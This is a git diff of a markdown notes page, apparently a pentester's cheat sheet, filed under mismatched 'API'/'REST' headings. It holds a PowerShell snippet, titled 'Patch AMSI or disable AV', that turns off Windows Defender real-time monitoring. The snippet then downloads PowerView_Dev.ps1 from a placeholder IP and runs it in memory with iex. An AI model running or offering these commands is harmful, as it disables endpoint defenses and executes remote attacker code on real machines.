@@ -7,18 +7,13 @@ permalink: /brainbox/
 # INFASTRUCTURE
 
 <details><summary> <b>API</b> </summary><blockquote>
-  <details><summary>REST</summary><blockquote>
-     # Patch AMSI or disable AV
-    <br>
-    ```powershell
+# Patch AMSI or disable AV
+<br>
+ ```powershell
       Set-MpPreference -DisableRealTimeMonitoring -DisableAVIOProtection $true
-      iex(New-Object System.Net.WebClient).downloadString('http:/x.x.x.x./PowerView_Dev.ps1')
-    ```
-
-  </blockquote></details>
-  <details><summary>SOAP</summary><blockquote>
-    :smile:
-  </blockquote></details>
+      iex(New-Object System.Net.WebClient).downloadString('http:/x.x.x.x./PowerView_Devps1')
+ ```
+  
 </blockquote></details>
 
 
